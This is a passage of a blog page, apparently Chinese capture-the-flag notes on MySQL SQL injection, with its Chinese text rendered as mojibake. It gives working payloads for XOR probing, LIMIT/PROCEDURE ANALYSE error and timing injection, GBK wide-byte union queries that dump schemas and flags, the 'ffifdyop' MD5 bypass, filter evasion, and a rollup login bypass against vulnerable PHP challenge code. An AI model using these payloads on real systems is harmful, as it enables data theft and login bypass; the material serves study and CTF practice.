class="string">'flag:'</span>,flag)</span><br></pre></td></tr></table></figure><h2 id="0x02-å¼‚æˆ–æ³¨å…¥xor"><a href="#0x02-å¼‚æˆ–æ³¨å…¥xor" class="headerlink" title="0x02 å¼‚æˆ–æ³¨å…¥xor/^"></a>0x02 å¼‚æˆ–æ³¨å…¥xor/^</h2><p>xorä¸^çš„åŒºåˆ«ï¼šå‰è€…æ˜¯åšé€»è¾‘è¿ç®— 1 xor 0 ä¼šè¾“å‡º1 å…¶ä»–æƒ…å†µè¾“å‡ºå…¶ä»–æ‰€æœ‰æ•°æ®ï¼›åè€…æ˜¯åšä½å¼‚æˆ–è¿ç®— å¦‚1^2=3 1^2=3</p><p>å¯ä»¥é‡‡ç”¨è¿™ç§æ–¹å¼æ¥åˆ¤æ–­ç›®æ ‡ç«™ç‚¹è¿‡æ»¤äº†ä»€ä¹ˆå…³é”®å­—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/1ndex.php?id=1&apos;^(length(&apos;union&apos;)=5)%23</span><br><span class="line">å½“unionè¢«è¿‡æ»¤æ—¶1^0 è¾“å‡ºid=1</span><br><span class="line">å½“unionæ²¡è¢«è¿‡æ»¤æ—¶ 1 ^ 1 è¾“å‡º id=0 å¹¶å›æ˜¾ error</span><br></pre></td></tr></table></figure><h2 id="0x03-limitæ³¨å…¥"><a href="#0x03-limitæ³¨å…¥" class="headerlink" title="0x03 limitæ³¨å…¥"></a>0x03 limitæ³¨å…¥</h2><p>åœ¨MySQL5.xç‰ˆæœ¬ä¸­ï¼Œåç«¯é‡‡ç”¨å¦‚ä¸‹å½¢å¼è¿›è¡ŒSQLæŸ¥è¯¢ï¼Œæ­¤æ—¶æ³¨å…¥ç‚¹åœ¨order byè¯­å¥åé¢æ— æ³•ä½¿ç”¨unionè¿›è¡Œè”åˆæŸ¥è¯¢ï¼Œå› è€Œéœ€è¦å¦è¾Ÿè¹Šå¾„ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT ã€æ³¨å…¥ç‚¹ã€‘</span><br></pre></td></tr></table></figure></p><p>åœ¨æ­¤å¤„æˆ‘ä»¬å¯ä»¥ä½¿ç”¨procedureå…³é”®å­—è°ƒç”¨ANALYSEå­˜å‚¨è¿‡ç¨‹æ¥å®Œæˆæ³¨å…¥ã€‚åˆ©ç”¨å§¿åŠ¿æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//1.æŠ¥é”™æ³¨å…¥</span><br><span class="line">mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br><span class="line"> </span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;:5.5.41-0ubuntu0.14.04.1&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT host FROM mysql.user ORDER BY 1 LIMIT 0 PROCEDURE ANALYSE (0, (SELECT 3 ORDER BY updatexml(1, concat(0x3A, version()), 1)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;:5.5&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//2.æ—¶é—´ç›²æ³¨ï¼Œæ³¨æ„æ­¤æ—¶ä¸èƒ½ä½¿ç”¨sleep</span><br><span class="line">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br><span class="line"></span><br><span class="line">//æ³¨:ä»¥ä¸Šå‡ºç°version()çš„åœ°æ–¹éƒ½å¯ä»¥ç”¨æƒ³ç”¨çš„SQLè¯­å¥æ›¿æ¢</span><br></pre></td></tr></table></figure><h2 id="0x04-åˆ©ç”¨insertï¼Œupdateå’Œdeleteæ³¨å…¥è·å–æ•°æ®"><a href="#0x04-åˆ©ç”¨insertï¼Œupdateå’Œdeleteæ³¨å…¥è·å–æ•°æ®" class="headerlink" title="0x04 åˆ©ç”¨insertï¼Œupdateå’Œdeleteæ³¨å…¥è·å–æ•°æ®"></a>0x04 åˆ©ç”¨insertï¼Œupdateå’Œdeleteæ³¨å…¥è·å–æ•°æ®</h2><p>é—­åˆå½¢å¼:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&apos; or (payload) or &apos;</span><br><span class="line">&apos; and (payload) and &apos;</span><br><span class="line">&apos; or (payload) and &apos;</span><br><span class="line">&apos; or (payload) and &apos;=&apos;</span><br><span class="line">&apos;* (payload) *&apos;</span><br><span class="line">&apos; or (payload) and &apos;</span><br><span class="line">&quot; â€“ (payload) â€“ &quot;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ–¹å¼:</p><ol><li>åˆ©ç”¨updatexml()è·å–æ•°æ®</li><li>åˆ©ç”¨extractvalue()è·å–æ•°æ®</li><li><p>åˆ©ç”¨name_const()è·å–æ•°æ®</p><p> æ³¨æ„ï¼š</p><blockquote><p>å¦‚æœæ˜¾ç¤ºERROR 1210 (HY000): Incorrect arguments to NAME_CONSTï¼Œé‚£å°±æ´—æ´—ç¡å§ã€‚ã€‚</p></blockquote></li></ol><blockquote><p>å¦‚æœæ˜¾ç¤ºERROR 1060 (42S21): Duplicate column name â€˜2â€™ï¼Œå°±å¯ä»¥è¿›ä¸€æ­¥è·å–æ›´å¤šæ•°æ®ã€‚</p><ol start="4"><li>åˆ©ç”¨å­æŸ¥è¯¢æ³¨å…¥</li></ol></blockquote><p>å‚è€ƒ:<a href="http://wooyun.jozxing.cc/static/drops/tips-2078.html" target="_blank" rel="noopener">åˆ©ç”¨insertï¼Œupdateå’Œdeleteæ³¨å…¥è·å–æ•°æ®</a></p><h2 id="0x05å½“updateæ³¨å…¥é‡åˆ°å…³é—­æ˜¾é”™"><a href="#0x05å½“updateæ³¨å…¥é‡åˆ°å…³é—­æ˜¾é”™" class="headerlink" title="0x05å½“updateæ³¨å…¥é‡åˆ°å…³é—­æ˜¾é”™"></a>0x05å½“updateæ³¨å…¥é‡åˆ°å…³é—­æ˜¾é”™</h2><p>æ³¨:æ­¤å¤„æåˆ°çš„æˆ–é€»è¾‘è¿ç®—å¯¹insertæ³¨å…¥ä¹Ÿæ˜¯æœ‰æ•ˆçš„</p><p>å‚è€ƒ:</p><p><a href="https://blog.spoock.com/2018/06/02/update-sqli-without-error/" target="_blank" rel="noopener">å½“updateæ³¨å…¥é‡åˆ°å…³é—­æ˜¾é”™</a></p><p><a href="http://godot.win/index.php/archives/9/" target="_blank" rel="noopener">åœ¨Updateçš„æ³¨å…¥ä¸­å¦‚æœå…³é—­äº†æ˜¾é”™è¯¥æ€ä¹ˆåŠ</a></p><h2 id="0x06-Mysqlå­—ç¬¦ç¼–ç åˆ©ç”¨æŠ€å·§"><a href="#0x06-Mysqlå­—ç¬¦ç¼–ç åˆ©ç”¨æŠ€å·§" class="headerlink" title="0x06 Mysqlå­—ç¬¦ç¼–ç åˆ©ç”¨æŠ€å·§"></a>0x06 Mysqlå­—ç¬¦ç¼–ç åˆ©ç”¨æŠ€å·§</h2><p>latin1ç¼–ç ä¸æ”¯æŒæ±‰å­—ï¼Œå› è€Œå¯ä»¥é‡‡ç”¨ç¼–ç ç»•è¿‡</p><p>å‚è€ƒ:<br><a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="noopener">ã€ŠMysqlå­—ç¬¦ç¼–ç åˆ©ç”¨æŠ€å·§ã€‹</a></p><h2 id="0x07-GBK-Injection"><a href="#0x07-GBK-Injection" class="headerlink" title="0x07 GBK Injection"></a>0x07 GBK Injection</h2><p>å•å¼•å·ä¼šè¢«/æ³¨æ‰ï¼Œå¯ä»¥ç”¨%dfåƒæ‰/å°é—­id</p><p>æŸ¥è¯¢å­—æ®µæ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&apos; order by 2%23</span><br></pre></td></tr></table></figure><p>æœç„¶ä¸¤ä¸ªï¼Œé¡ºå¸¦æŸ¥çœ‹å…¶ç”¨æˆ·ï¼Œåº“åå’Œç‰ˆæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&apos; union select 1,concat_ws(char(32,58,32),user(),database(),version())%23</span><br></pre></td></tr></table></figure><p>æ³¨:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># concat_ws()ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åˆ†éš”å­—ç¬¦</span><br><span class="line"># char(32,58,32)è¡¨ç¤ºçš„æ˜¯ &quot;:&quot; å·</span><br><span class="line">MariaDB [(none)]&gt; select concat_ws(char(32,58,32),&apos;11&apos;,&apos;22&apos;,&apos;33&apos;);</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| concat_ws(char(32,58,32),&apos;11&apos;,&apos;22&apos;,&apos;33&apos;) |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| 11 : 22 : 33                             |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>åº“åsae-chinalover,å†çˆ†è¡¨</p><p>å•å¼•å·ä¼šè¢«/æ³¨æ‰ï¼Œæ‰€ä»¥å†™sae-chinaloverçš„16è¿›åˆ¶<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 0x7361652d6368696e616c6f766572)%23</span><br></pre></td></tr></table></figure></p><p>æ³¨ï¼š<br>group_concat()æ˜¯å°†æŸä¸ªå­—æ®µçš„æ‰€æœ‰å€¼æ‰“å°åœ¨ä¸€èµ·ï¼Œæ–¹ä¾¿ä¸€è¡Œè¾“å‡ºã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select group_concat(name) from aa;</span><br><span class="line">+-------------------+</span><br><span class="line">|group_concat(name) |</span><br><span class="line">+-------------------+</span><br><span class="line">|10,20,20|</span><br></pre></td></tr></table></figure><p>æœ‰å››ä¸ªï¼šctf,ctf2,ctf3,ctf4,newsï¼Œçˆ†åˆ—å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&apos; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = 0x7361652d6368696e616c6f766572 and table_name=0x63746634)%23</span><br></pre></td></tr></table></figure><p>ctf4é‡Œæœ‰id,flag,flagåº”è¯¥å°±åœ¨è¿™é‡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&apos; union select 1,(select group_concat(id,flag) from ctf4)%23</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ„é€ çˆ†é”™åå¸¸è§„æ³¨å…¥å³å¯ã€‚</p><h2 id="0x08-MD5åŠ å¯†åçš„SQLi"><a href="#0x08-MD5åŠ å¯†åçš„SQLi" class="headerlink" title="0x08 MD5åŠ å¯†åçš„SQLi"></a>0x08 MD5åŠ å¯†åçš„SQLi</h2><p>ç›®æ ‡è¯­å¥:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;select * from admin where password=&apos;&quot;.md5($pass,true).&quot;&apos;&quot;</span><br></pre></td></tr></table></figure><blockquote><p>md5(string,raw)</p><p>string å¿…éœ€ã€‚è§„å®šè¦è®¡ç®—çš„å­—ç¬¦ä¸²ã€‚</p><p>raw å¯é€‰ã€‚è§„å®šåå…­è¿›åˆ¶æˆ–äºŒè¿›åˆ¶è¾“å‡ºæ ¼å¼ï¼š</p><p>â€¢ TRUE â€“ åŸå§‹ 16 å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ &lt;å…³é”®ç‚¹&gt;</p><p>â€¢ FALSE â€“ é»˜è®¤ã€‚32 åå…­è¿›åˆ¶æ•°</p></blockquote><p>æ³¨å…¥æ€è·¯:</p><p>å­—ç¬¦ä¸²ç»md5è®¡ç®—åçš„å€¼ç»è¿‡hexè½¬æˆå­—ç¬¦ä¸²åä¸º â€orâ€™xxxâ€™è¿™æ ·çš„å­—ç¬¦ä¸²</p><p>æ„é€ payloadç›®æ ‡:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where password=&quot;or&apos;xxx&apos;</span><br></pre></td></tr></table></figure><p>å¯ç”¨payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">content: 129581926211651571912466741651878684928</span><br><span class="line"></span><br><span class="line">md5åŠ å¯†ä¸º: 06da5430449f8f6f23dfc1276f722738</span><br><span class="line"></span><br><span class="line">ä½œhexè½¬å­—ç¬¦ä¸²: ?T0D??o#??â€™orâ€™8.N=?</span><br><span class="line"></span><br><span class="line">content: ffifdyop</span><br><span class="line"></span><br><span class="line">md5åŠ å¯†ä¸º: 276f722736c95d99e921722cf9ed621c</span><br><span class="line"></span><br><span class="line">ä½œhexè½¬å­—ç¬¦ä¸²: â€˜orâ€™6è’¥æ¬“!r,î‹b</span><br></pre></td></tr></table></figure><p>æ³¨ï¼šè¿™ä¸ªé—®é¢˜æ˜¯åœ¨PHPä¸­å­˜åœ¨çš„</p><h2 id="0x09-ç©ºæ ¼è¢«è¿‡æ»¤"><a href="#0x09-ç©ºæ ¼è¢«è¿‡æ»¤" class="headerlink" title="0x09 ç©ºæ ¼è¢«è¿‡æ»¤"></a>0x09 ç©ºæ ¼è¢«è¿‡æ»¤</h2><p>ç©ºæ ¼è¿‡æ»¤ä½¿ç”¨<code>/*xxx*/</code>è¿›è¡Œç»•è¿‡ï¼Œ</p><p>æœ‰æ—¶å€™å…³é”®è¯è¢«è¿‡æ»¤äº†å¯ä»¥ä½¿ç”¨åŒå†™ç»•è¿‡</p><p>ä¾‹å¦‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//ä¸ºä¸‰ä¸ªå­—æ®µï¼Œæ¥ç€æŸ¥åº“</span><br><span class="line">?id=1/*0*/order/*0*/by/*0*/3%23</span><br><span class="line"></span><br><span class="line">?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,concat_ws(char(32,58,32),user(),database(),version())%23</span><br><span class="line"></span><br><span class="line">//æŸ¥æ‰€æœ‰åº“</span><br><span class="line">?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,group_concat(schema_name)/*0*/frfromom/*0*/information_schema.schemata%23</span><br><span class="line"></span><br><span class="line">//æŸ¥testçš„è¡¨</span><br><span class="line">?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,group_concat(table_name)/*0*/frfromom/*0*/information_schema.tables/*0*/where/*0*/table_schema=0x74657374%23</span><br><span class="line"></span><br><span class="line">//åªæœ‰ä¸€ä¸ªcontent,æŸ¥åˆ—</span><br><span class="line">?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,group_concat(column_name)/*0*/frfromom/*0*/information_schema.columns/*0*/where/*0*/table_schema=0x74657374/*0*/and/*0*/table_name=0x636f6e74656e74%23</span><br><span class="line"></span><br><span class="line">//æœ‰id,context,titleã€‚æœ€åç›´æ¥æŸ¥context</span><br><span class="line">?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,context/*0*/frfromom/*0*/content%23</span><br><span class="line"></span><br><span class="line">//å¾—åˆ°flag</span><br></pre></td></tr></table></figure><h2 id="0x10-ç¬¦å·é—®é¢˜"><a href="#0x10-ç¬¦å·é—®é¢˜" class="headerlink" title="0x10 ç¬¦å·é—®é¢˜"></a>0x10 <code></code>ç¬¦å·é—®é¢˜</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">"config.php"</span>);</span><br><span class="line">$table = $_GET[<span class="string">'table'</span>]?$_GET[<span class="string">'table'</span>]:<span class="string">"test"</span>;</span><br><span class="line">$table = Filter($table);</span><br><span class="line">mysqli_query($mysqli,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</span><br><span class="line">$sql = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</span><br><span class="line">$ret = sql_query($sql);</span><br><span class="line"><span class="keyword">echo</span> $ret[<span class="number">0</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>åå¼•å·æ˜¯ä¸ºäº†åŒºåˆ†MySqlçš„ä¿ç•™å­—æ®µä¸æ™®é€šå­—ç¬¦è€Œå¼•å…¥çš„ç¬¦å·</p><p>å¼•å·ä¸€èˆ¬ç”¨åœ¨å­—æ®µçš„å€¼ï¼Œå¦‚æœå­—æ®µå€¼æ˜¯å­—ç¬¦æˆ–å­—ç¬¦ä¸²ï¼Œåˆ™è¦åŠ å¼•å·</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select `flag` from flags;</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| flag                                   |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| flag&#123;37316894c36cb32d2ca3f7d3add88024&#125; |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [test]&gt; select &apos;flag&apos; from flags;</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>payload:æ„é€ å¦‚ä¸‹å½¢å¼è¿›è¡Œæ³¨å…¥ï¼Œ***ä½ç½®æ”¾å…¥å…³é”®è¯<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">desc `***` `***`;</span><br><span class="line"></span><br><span class="line">MariaDB [test]&gt; desc `flags` `union select table_name from information_schema.tables`;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/?table=test`  `union select table_name from information_schema.tables limit 1,1</span><br><span class="line"></span><br><span class="line">http://test.com/?table=test`  `union select column_name from information_schema.columns limit 1,1</span><br><span class="line"></span><br><span class="line">http://test.com/?table=test`  `union select flagUwillNeverKnow from secret_flag limit 1,1</span><br></pre></td></tr></table></figure><h2 id="0x11-rollup-amp-amp-offset"><a href="#0x11-rollup-amp-amp-offset" class="headerlink" title="0x11 rollup&amp;&amp;offset"></a>0x11 rollup&amp;&amp;offset</h2><p><code>limit 1 offset 2</code>ä»ç¬¬äºŒæ¡è®°å½•å¼€å§‹æŸ¥è¯¢ï¼Œè¯»å–1æ¡è®°å½•ï¼ˆintrude fuzz 1å’Œ2è¿™ä¸¤ä¸ªä½ç½®çš„å‚æ•°ï¼‰</p><p><code>rollup</code>åœ¨group by åˆ†ç»„ä¹‹åï¼Œå†åˆè®¡æ€»æ•°ï¼Œå¯æ„é€ ä½¿å¾—ç»“æœä¸ºnull</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'pwd'</span>])) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;input name="uname" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;input name="pwd" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;input type="submit" /&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;!--source: source.txt--&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span><span class="params">($StrKey,$StrValue,$ArrReq)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (is_array($StrValue))&#123;</span><br><span class="line">        $StrValue=implode($StrValue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrReq.<span class="string">"/is"</span>,$StrValue)==<span class="number">1</span>)&#123;   </span><br><span class="line">        <span class="keyword">print</span> <span class="string">"å§˜æ‘å½²æå€Ÿå·é”›å±¼å®³é™îˆç¦Œé‘¹å›·ç´’"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$con = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</span><br><span class="line"><span class="keyword">if</span> (!$con)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">$db=<span class="string">"XXXXXX"</span>;</span><br><span class="line">mysql_select_db($db, $con);</span><br><span class="line"><span class="comment">#$sql="SELECT * FROM interest WHERE uname = ''  or 1=1 group by pwd with rollup limit 1 offset 2 #'";</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'"</span>;</span><br><span class="line">$query = mysql_query($sql); </span><br><span class="line"><span class="keyword">if</span> (mysql_num_rows($query) == <span class="number">1</span>) &#123; </span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line">    <span class="keyword">if</span>($key[<span class="string">'pwd'</span>] == $_POST[<span class="string">'pwd'</span>]) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"æµœï¹€å½²ç’§æ¶œå¢–é”›ï¿½"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"æ¶“â‚¬æ£°æ¥„ç¦Œé‘¹å›·ç´’"</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è·å–flagéœ€è¦æ»¡è¶³<code>mysql_num_rows($query) == 1</code>å’Œ<code>$key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]</code>ï¼Œåè€…ä½¿ç”¨<code>group by pwd with rollup</code>åœ¨æŸ¥è¯¢ç»“æœä¸­åŠ ä¸Šä¸€è¡Œï¼Œä¸”pwdå­—æ®µçš„å€¼ä¸ºNULL,ä»¥æ­¤ç»•è¿‡<code>$key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]</code>è¿‡æ»¤,åˆ™ä½¿ç”¨<code>limit # offset #</code>æ¥æ»¡è¶³<code>mysql_num_rows($query) == 1</code>,fuzzå‡º<code>limit 1 offset 2</code></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or 1=1 group by pwd with rollup limit 1 offset 2 #</span><br></pre></td></tr></table></figure><p>test</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select text from article group by NULL with rollup limit 1 offset 2 ;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [test]&gt; select * from article;</span><br><span class="line">+---------+-----------------------------------------------------+</span><br><span class="line">| id      | text                                                |</span><br><span class="line">+---------+-----------------------------------------------------+</span><br><span class="line">| 1       | guess what?                                         |</span><br><span class="line">| 3       | you can test it with sqli                           |</span><br><span class="line">| 2       | dudulu                                              |</span><br><span class="line">| 4       | The choice of the stone gate of all dead destinies! |</span><br><span class="line">| 5       | ??? ???                                             |</span><br><span class="line">| 8848    | you want by a phone?                                |</span><br><span class="line">| 9588    | you will be lucky                                   |</span><br><span class="line">| 1245123 | flag&#123;37316894c36cb32d2ca3f7d3add88024&#125;              |</span><br><span class="line">+---------+-----------------------------------------------------+</span><br><span class="line">8 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="0x12-æ³¨å‡ºå¯æ§æ•°æ®ç»•è¿‡ç™»å½•"><a 